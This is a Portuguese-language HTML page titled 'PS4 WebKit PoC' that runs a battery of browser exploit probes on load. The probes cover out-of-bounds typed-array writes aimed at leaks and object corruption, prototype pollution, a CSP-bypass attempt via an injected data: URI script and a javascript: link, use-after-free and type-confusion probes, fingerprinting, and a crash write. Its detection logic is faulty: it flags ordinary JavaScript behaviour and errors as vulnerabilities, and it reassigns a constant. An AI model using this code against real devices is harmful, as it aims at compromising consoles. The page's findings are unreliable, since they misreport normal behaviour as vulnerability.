<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit PoC - Exploração Direcionada</title>
    <style>
        /* Estilos CSS (iguais ao script focado) */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; }
        #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; }
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
        .log-vuln { color: #ff4444; font-weight: bold; }
        .log-good { color: #4CAF50; }
        .log-warn { color: #FFC107; }
        .log-error { color: #f44336; }
    </style>
</head>
<body>
    <h1>PS4 WebKit PoC - Tentativas de Exploração Direcionada</h1>
    <p>AVISO: Script complexo focado em Info Leak (tipos), Corrupção de Objeto Adjacente, Impacto PP, CSP, UAF, TC. Pode travar.</p>
    <div id="poc-output"></div>

    <script>
        const outputDiv = document.getElementById('poc-output');
        const log = (message, type = 'info') => {
            // Função log
            if (!outputDiv) return; // Se sumir, parar de logar
            try {
                const timestamp = `[${new Date().toLocaleTimeString()}] `;
                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                outputDiv.innerHTML += `<span class="log-${type}">${timestamp}${sanitizedMessage}\n</span>`;
                outputDiv.scrollTop = outputDiv.scrollHeight;
             } catch (e) {
                 console.error("Erro fatal no logging ou div sumiu.");
                 // Desativar logging para evitar loop infinito se innerHTML falhar
                 outputDiv = null;
             }
        };

        const PAUSE_DURATION = 500;

        // --- Funções de Teste Atualizadas/Novas ---

        // Teste 1: OOB Write + Tentativa de Info Leak Avançada (Múltiplos Tipos)
        const runOOBLeakAdvanced = async () => {
            log("--- Iniciando Teste 1: OOB Write + Advanced Info Leak ---", 'test');
            try {
                const bufferSize = 64; const buffer = new ArrayBuffer(bufferSize);
                const u8view = new Uint8Array(buffer); const u32view = new Uint32Array(buffer); const f64view = new Float64Array(buffer);
                const writeOffset = bufferSize; const writeValue = 0xAA;
                log(`Tentando escrita OOB U8 no offset ${writeOffset}...`, 'subtest');
                try {
                    u8view[writeOffset] = writeValue;
                    log(`VULNERÁVEL: Escrita OOB U8 no offset ${writeOffset} bem-sucedida!`, 'vuln');
                    const leakOffsetBytes = writeOffset; const readLength = 8; // Ler mais bytes/elementos
                    log(`Tentando Info Leak OOB em offset ${leakOffsetBytes} (bytes) lendo ${readLength} elementos...`, 'subtest');
                    let leakedData = false;
                    // Ler como U8
                    for (let i = 0; i < readLength; i++) { let currentOffset = leakOffsetBytes + i; try { const val = u8view[currentOffset]; if(val !== undefined && val !== 0){ log(`  Leak U8[${currentOffset}]: 0x${val.toString(16)}`, 'warn'); leakedData = true;} } catch(e){} }
                    // Ler como U32
                    const leakOffsetU32 = Math.ceil(leakOffsetBytes / 4);
                    for (let i = 0; i < readLength; i++) { let currentOffset = leakOffsetU32 + i; try { const val = u32view[currentOffset]; if(val !== undefined && val !== 0){ log(`  Leak U32[${currentOffset}]: 0x${val.toString(16)}`, 'warn'); leakedData = true; if(val > 0xFFFF) log(`    >> Potencial Ponteiro/Dado!`, 'vuln');} } catch(e){} }
                    // Ler como F64
                    const leakOffsetF64 = Math.ceil(leakOffsetBytes / 8);
                     for (let i = 0; i < readLength; i++) { let currentOffset = leakOffsetF64 + i; try { const val = f64view[currentOffset]; if(!isNaN(val) && val !== 0){ log(`  Leak F64[${currentOffset}]: ${val}`, 'warn'); leakedData = true; log(`    >> Potencial Float/Dado!`, 'vuln');} } catch(e){} }

                    if (!leakedData) { log("Nenhum dado OOB não-zero/definido encontrado nesta leitura.", 'info');}

                } catch (writeError) { log(`✅ Escrita OOB U8 bloqueada/erro: ${writeError.message}`, 'good'); }
            } catch (e) { log(`Erro GERAL no teste OOB Leak Adv: ${e.message}`, 'warn'); }
            log("--- Teste 1 Concluído ---", 'test');
        };

        // Teste 2: OOB Write visando Corrupção de Objeto Adjacente
        const runOOBCorruptAdjacent = async () => {
             log("--- Iniciando Teste 2: OOB Write visando Corrupção de Objeto Adjacente ---", 'test');
             try {
                 log("Alocando Buffer de Ataque e Objeto Alvo...", 'info');
                 // Alocar primeiro o objeto alvo, depois o buffer pode (ou não) colocá-los adjacentes
                 let targetObject = { id: 12345, name: "Target", value: 5.5, active: true };
                 let attackBuffer = new ArrayBuffer(32);
                 let attackView = new Uint8Array(attackBuffer);
                 const originalTargetState = JSON.stringify(targetObject);
                 log(`Objeto alvo inicial: ${originalTargetState}`, 'info');

                 const oobOffset = 32; // Começar a escrever logo após o buffer
                 const writeLength = 16; // Tentar corromper alguns bytes
                 const valuesToWrite = [0, 0xFF, 0x41]; // 0, FF, 'A'

                 for(const value of valuesToWrite){
                     log(`Tentando escrita OOB (valor=${value}) em offsets ${oobOffset}-${oobOffset+writeLength-1} visando objeto...`, 'subtest');
                     try {
                        // Escrever OOB em uma pequena região
                        for (let i=0; i<writeLength; i++){
                             attackView[oobOffset + i] = value;
                        }
                        log(`Escrita OOB realizada. Verificando objeto alvo...`, 'info');

                         // Verificar se o objeto alvo foi corrompido
                         let changed = false;
                         if (targetObject.id !== 12345) { log(`VULNERÁVEL: targetObject.id alterado para ${targetObject.id}`, 'vuln'); changed = true; }
                         if (targetObject.name !== "Target") { log(`VULNERÁVEL: targetObject.name alterado para ${targetObject.name}`, 'vuln'); changed = true; }
                         if (targetObject.value !== 5.5) { log(`VULNERÁVEL: targetObject.value alterado para ${targetObject.value}`, 'vuln'); changed = true; }
                         if (targetObject.active !== true) { log(`VULNERÁVEL: targetObject.active alterado para ${targetObject.active}`, 'vuln'); changed = true; }
                         if (typeof targetObject !== 'object') {log(`VULNERÁVEL: typeof targetObject alterado para ${typeof targetObject}`, 'vuln'); changed = true; }

                         if (!changed) { log(`Nenhuma corrupção óbvia detectada no objeto alvo com valor ${value}.`, 'info'); }

                         // Resetar o objeto alvo para o próximo teste de valor (se possível)
                         targetObject = JSON.parse(originalTargetState);


                     } catch (writeError) {
                         log(`✅ Escrita OOB bloqueada/erro: ${writeError.message}`, 'good');
                         break;
                     }
                     await new Promise(resolve => setTimeout(resolve, 50));
                 }


             } catch (e) { log(`Erro GERAL no teste OOB Corrupt Adj: ${e.message}`, 'warn'); }
             log("--- Teste 2 Concluído ---", 'test');
        };

        // Teste 3: Prototype Pollution + Tentativa de Impacto em Função
        const runPPFunctionImpact = () => {
            log("--- Iniciando Teste 3: Prototype Pollution + Impacto em Função ---", 'test');
            const pollutionKey = 'map'; // Poluir Array.prototype.map
            const originalMap = Array.prototype.map; // Salvar original
            let pollutionSuccess = false;

            try {
                const pollutionValue = function(...args) {
                    log(`VULNERÁVEL: Array.prototype.map POLUÍDO foi chamado! Args: ${args.length}`, "vuln");
                    // Chamar o original para não quebrar tudo (se possível)
                    // Ou retornar um valor fixo
                    // return originalMap.call(this, ...args); // Pode causar loop ou erro se 'this' estiver errado
                    return ["polluted"]; // Retornar valor fixo
                };

                log(`Tentando poluir Array.prototype['${pollutionKey}']...`, 'info');
                Array.prototype[pollutionKey] = pollutionValue;

                // Verificar
                 if (Array.prototype.map === pollutionValue && [].map === pollutionValue) {
                     log("Poluição de Array.prototype.map parece bem-sucedida.", 'info');
                     pollutionSuccess = true;

                     log("Chamando [1, 2].map(x => x * 2)...", 'subtest');
                     try {
                         let result = [1, 2].map(x => x * 2);
                         log(`Resultado da chamada map: ${JSON.stringify(result)}`, 'warn'); // Deve mostrar ["polluted"] se funcionou
                         if(JSON.stringify(result) === JSON.stringify(["polluted"])) {
                            log("Confirmação: Chamada de .map usou a função poluída!", 'vuln');
                         }
                     } catch (mapError) {
                         log(`Erro ao chamar .map poluído: ${mapError.message}`, 'error');
                     }

                 } else {
                      log("Falha ao poluir Array.prototype.map.", 'warn');
                 }

            } catch (e) {
                log(`Erro GERAL no teste PP Function Impact: ${e.message}`, 'warn');
            } finally {
                 // Limpeza CRUCIAL
                 if (pollutionSuccess) {
                    log("Restaurando Array.prototype.map original...", 'info');
                    Array.prototype.map = originalMap;
                     if (Array.prototype.map === originalMap) {
                        log("Restauração de .map ok.", 'good');
                     } else {
                         log("FALHA ao restaurar .map!", 'error');
                     }
                 }
            }
            log("--- Teste 3 Concluído ---", 'test');
        };


        // Teste 4: CSP Bypass + Payload Avançado (simulando chamada de OOB)
        const runCSPAdvancedPayload = () => {
            // Mantido igual ao script anterior (Teste 3 lá)
            log("--- Iniciando Teste 4: CSP Bypass + Payload Avançado ---", 'test');
            log("Tentando carregar payload OOB via data: URI...", 'info');
            try {
                const payloadJS = `log("[Payload Injetado] Iniciando...", "info"); try { let buf = new ArrayBuffer(16); let view = new Uint8Array(buf); view[-1] = 0xCC; log("[Payload Injetado] VULNERÁVEL: Escrita OOB dentro do payload funcionou!", "vuln"); } catch(e) { log("[Payload Injetado] Erro na escrita OOB: " + e.message, "good"); } log("[Payload Injetado] Concluído.", "info");`;
                const encodedPayload = btoa(payloadJS);
                const scriptTag = document.createElement('script'); scriptTag.src = 'data:text/javascript;base64,' + encodedPayload;
                scriptTag.onerror = () => { log("ERRO: Falha ao carregar script data: com payload!", 'error');}; document.body.appendChild(scriptTag);
                log("Tag script com payload OOB adicionada.", 'info');
            } catch (e) { log(`Erro ao criar payload data:: ${e.message}`, 'warn'); }
             log("Tentando injetar link com javascript: URI (requer clique)...", 'info');
             try {
                const jsLink = document.createElement('a'); jsLink.href = "javascript:log('VULNERÁVEL: Bypass de CSP via javascript: URI em link clicado!', 'vuln'); try{alert('Bypass via javascript: URI!');}catch(e){log('Alerta bloqueado no javascript: URI', 'warn');}";
                jsLink.textContent = "[Clique AQUI para Testar javascript: URI Bypass]"; jsLink.style.display='block'; jsLink.style.margin='10px'; jsLink.style.padding='5px'; jsLink.style.border='1px solid orange'; jsLink.style.color='orange';
                outputDiv.appendChild(jsLink); log("Link com javascript: URI adicionado.", 'warn');
            } catch (e) { log(`Erro ao criar link javascript:: ${e.message}`, 'warn'); }
            log("--- Teste 4 Concluído ---", 'test');
        };

        // Teste 5: Prototype Pollution Básico (Confirmação)
        const runPPBasic = () => {
            // Mantido igual ao script anterior (Teste 6 lá), renomeado
             log("--- Iniciando Teste 5: Prototype Pollution Básico (Confirmação) ---", 'test');
            const k='poc_inj_basic', v='PollutedBasic!'; try { log(`Tentando poluir Object.prototype['${k}']...`, 'info'); Object.prototype[k]=v; const t={'w':window,'d':document,'n':{}}; let c=0; for(const n in t){ try { if(t[n] && t[n][k]===v){log(`VULNERÁVEL: PP básica detectada! ${n}.${k}=${t[n][k]}`, 'vuln'); c++;}} catch(e){} } if(c>0){log(`Confirmado: ${c} objeto(s) poluído(s).`, 'vuln');} else {log(`Aviso: Não confirmou poluição básica.`, 'warn');} try{delete Object.prototype[k];log("Limpou poluição básica.",'info');}catch(e){log(`Erro limpar PP básica: ${e.message}`,'warn');} } catch(e){log(`Erro GERAL PP básica: ${e.message}`,'warn');}
             log("--- Teste 5 Concluído ---", 'test');
        };

        // Teste 6: Use-After-Free (UAF) Básico + SVG
        const runUAFTests = async () => { /* Mantido igual (Teste 7 anterior) */
             log("--- Iniciando Teste 6: Use-After-Free (UAF) Básico + SVG ---", 'test');
             log("Cenário 1: Nó DOM.", 'subtest'); let r1=null; try { let p=document.createElement('div'), c=document.createElement('span'); p.appendChild(c); document.body.appendChild(p); r1=c; log("DOM Add ok.",'info'); p.removeChild(c); document.body.removeChild(p); p=null; c=null; log("DOM Rem ok. GC...",'info'); try{new ArrayBuffer(10*1024*1024);}catch(e){} await new Promise(r=>setTimeout(r,200)); log("Tentando DOM ref.tagName...",'info'); let tn=r1.tagName; log(`tagName ok:${tn}`,'warn'); log("Tentando DOM ref.getBoundingClientRect...",'info'); r1.getBoundingClientRect(); log(`getBBox ok.`,'warn'); } catch(e){log(`ERRO (Pot. UAF DOM):${e.message}`,'vuln');} finally{r1=null;}
             log("Cenário 2: Nó SVG.", 'subtest'); let r2=null; const ns="http://www.w3.org/2000/svg"; try { let p=document.createElementNS(ns,"svg"), c=document.createElementNS(ns,"rect"); p.appendChild(c); document.body.appendChild(p); r2=c; log("SVG Add ok.",'info'); p.removeChild(c); document.body.removeChild(p); p=null; c=null; log("SVG Rem ok. GC...",'info'); try{new ArrayBuffer(10*1024*1024);}catch(e){} await new Promise(r=>setTimeout(r,200)); log("Tentando SVG ref.id...",'info'); let id=r2.id; log(`id ok:${id}`,'warn'); log("Tentando SVG ref.getBBox...",'info'); r2.getBBox(); log(`getBBox ok.`,'warn'); } catch(e){log(`ERRO (Pot. UAF SVG):${e.message}`,'vuln');} finally{r2=null;}
             log("--- Teste 6 Concluído ---", 'test');
         };

        // Teste 7: Type Confusion Básico + APIs
        const runTypeConfusionTests = () => { /* Mantido igual (Teste 8 anterior) */
            log("--- Iniciando Teste 7: Type Confusion Básico + APIs ---", 'test');
            log("C1&2: DOM/toFixed", 'subtest'); try{window.postMessage(window,"*");log("postMsg ok",'good');}catch(e){log(`Erro postMsg:${e.message}`,'warn');} try{document.dispatchEvent({t:'c'});log("dispatchEv ok",'good');}catch(e){log(`Erro dispEv:${e.message}`,'warn');} try{let p=5,o=new Number(5);let r=p.toFixed(o);log(`.toFixed ok:${r}`,'good');}catch(e){log(`ERRO (.toFixed TC?):${e.message}`,'vuln');}
            log("C3: IndexedDB", 'subtest'); if(window.indexedDB){try{log("idxDB.open(123)",'info');window.indexedDB.open(123,1);log("idxDB sem erro",'warn');}catch(e){log(`Erro idxDB:${e.message}`,'good');}}else{log("idxDB N/A",'info');}
            log("C4: WebSocket", 'subtest'); if(window.WebSocket){try{log("new WS(123)",'info');new window.WebSocket(123);log("WS sem erro",'warn');}catch(e){log(`Erro WS:${e.message}`,'good');}}else{log("WS N/A",'info');}
            log("--- Teste 7 Concluído ---", 'test');
        };

        // Teste 8: Environment Probing
        const runEnvironmentProbing = () => { /* Mantido igual (Teste 9 anterior) */
             log("--- Iniciando Teste 8: Environment Probing ---", 'test');
             try{log("'navigator':",'subtest');for(const k in navigator){try{log(` nav.${k}=${navigator[k]}`,'info');}catch(e){}} }catch(e){log("Erro navigator",'warn');}
             try{log("'screen':",'subtest');for(const k in screen){try{log(` scr.${k}=${screen[k]}`,'info');}catch(e){}} }catch(e){log("Erro screen",'warn');}
             try{log("Stack Trace:",'subtest');throw new TypeError("err");}catch(e){log(` stack:${e.stack}`,'info');}
             log("--- Teste 8 Concluído ---", 'test');
        };

        // Teste 9: OOB Crash Probe
        const runOOBCrashProbe = async () => { /* Mantido igual (Teste 10 anterior), renumerado */
            log("--- Iniciando Teste 9: OOB Crash Probe ---", 'test');
            log("AVISO: PODE TRAVAR!", 'warn'); await new Promise(resolve => setTimeout(resolve, 3000));
            try { const b=new ArrayBuffer(32), v=new Uint8Array(b); const o=-20000, w=0xDEADBEEF; log(`Tentando escrita OOB AGRESSIVA offset ${o}...`, 'info'); v[o]=w; log(`AVISO: Escrita OOB agressiva NÃO travou.`, 'warn');
            } catch (e) { log(`Erro crash probe (NÃO travou): ${e.message}`, 'warn'); } log("--- Teste 9 Concluído (se não travou) ---", 'test');
        };


        // --- Função Principal de Execução ---
        const runAllTests = async () => {
            log("Iniciando todos os testes de PoC (EXPLORAÇÃO DIRECIONADA)...");
            const tests = [
                runOOBLeakAdvanced,       // Teste 1 - Foco Info Leak
                runOOBCorruptAdjacent,    // Teste 2 - Foco Corrupção Objeto Adjacente
                runPPFunctionImpact,      // Teste 3 - Foco Impacto PP em Função
                runCSPAdvancedPayload,    // Teste 4 - CSP com Payload + Link JS
                runPPBasic,               // Teste 5 - PP Básica (Confirmação)
                runUAFTests,              // Teste 6 - UAF Básico + SVG
                runTypeConfusionTests,    // Teste 7 - TC Básico + APIs
                runEnvironmentProbing,    // Teste 8 - Env Probe
                runOOBCrashProbe          // Teste 9 - Crash Probe (Último)
            ];

            for(let i=0; i < tests.length; i++){
                if (!document.getElementById('poc-output')) {
                     console.error("Output div sumiu, provável crash/problema.");
                     break;
                }
                 try {
                    await tests[i]();
                 } catch(testError) {
                    log(`ERRO INESPERADO DURANTE TESTE ${i+1}: ${testError.message}`, 'error');
                 }

                 if (i < tests.length - 1) {
                    log(`Pausa ${PAUSE_DURATION}ms...`, 'info');
                    await new Promise(resolve => setTimeout(resolve, PAUSE_DURATION));
                 }
            }

            log("\n\nTodos os testes PoC DIRECIONADOS foram concluídos (se não travou). Revise o log acima.", 'test');
        };

        // Executar ao carregar a página
        document.addEventListener('DOMContentLoaded', runAllTests);

    </script>

</body>
</html>
